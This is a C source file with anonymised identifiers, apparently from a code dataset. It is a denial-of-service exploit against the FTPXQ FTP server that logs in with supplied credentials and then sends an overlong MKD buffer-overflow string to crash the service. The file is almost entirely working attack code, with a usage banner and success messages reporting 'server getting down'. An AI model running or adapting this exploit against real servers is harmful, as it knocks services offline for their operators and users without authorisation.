
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int tmpbuf ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; scalar_t__ h_addr; } ;
typedef int socklen_t ;
typedef int saddr ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (char*,char*,int ) ;
 char* VAR_3 ;
 int FUNC_2 (char*,int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int,struct sockaddr*,int) ;
 int FUNC_5 (int) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 (char*) ;
 scalar_t__ FUNC_11 (int,char*,int) ;
 int FUNC_12 (int ,int ,int ) ;
 int FUNC_13 (char*,char*,char*) ;
 int FUNC_14 (char*) ;
 int FUNC_15 (int,char*,int ) ;

int FUNC_16(int VAR_4, char **VAR_5) {
    int VAR_6;
    socklen_t VAR_7;
    struct sockaddr_in VAR_8;
    struct hostent *VAR_9;
    char VAR_10[512], VAR_11[128];

    if(VAR_4 != 5) {
        FUNC_9("FTPXQ Server - Denial of service exploit.\n"
               "Federico Fazzi <federicoautistici.org>\n\n"
               "usage: %s <hostname> <port> <user> <password>\n", VAR_5[0]);
            FUNC_5(1);
    }

    if((VAR_9 = FUNC_6(VAR_5[1])) == ((void*)0)) {
        FUNC_8("gethostbyname()");
            FUNC_5(1);
    }


    if((VAR_6 = FUNC_12(VAR_0, VAR_2, VAR_1)) < 0) {
        FUNC_8("socket()");
            FUNC_5(1);
    }


    FUNC_2((char *) &VAR_8, sizeof(VAR_8));
    VAR_8.sin_family = VAR_0;
    FUNC_1((char *)VAR_9->h_addr, (char *)&VAR_8.sin_addr.s_addr, VAR_9->h_length);
    VAR_8.sin_port = FUNC_7(FUNC_0(VAR_5[2]));

    VAR_7 = sizeof(struct sockaddr);

    if(FUNC_4(VAR_6, (struct sockaddr *)&VAR_8, VAR_7) == -1) {
            FUNC_8("connect()");
            FUNC_5(1);
    }
    FUNC_9("FTPXQ Server - Denial of service exploit.\n"
           "Federico Fazzi <federicoautistici.org>\n"
           "---------------------------------------\n");
    FUNC_10("connecting..\t\t done");


    FUNC_13(VAR_10, "USER %s\r\n", VAR_5[3]);
    FUNC_15(VAR_6, VAR_10, FUNC_14(VAR_10));
    FUNC_10("sending USER data..\t done");


    FUNC_13(VAR_10, "PASS %s\r\n", VAR_5[4]);
    FUNC_15(VAR_6, VAR_10, FUNC_14(VAR_10));
    FUNC_10("sending PASS data..\t done");


    FUNC_13(VAR_10, "MKD %s", VAR_3);
    FUNC_15(VAR_6, VAR_3, FUNC_14(VAR_3));
    FUNC_10("sending MKD bof string.. done");


    if(FUNC_11(VAR_6, VAR_11, sizeof(VAR_11)) > 0)
        FUNC_10("[!] server doesn't vulnerable");
    else
        FUNC_10("[+] server getting down.. done");
    FUNC_3(VAR_6);

    return(0);
}
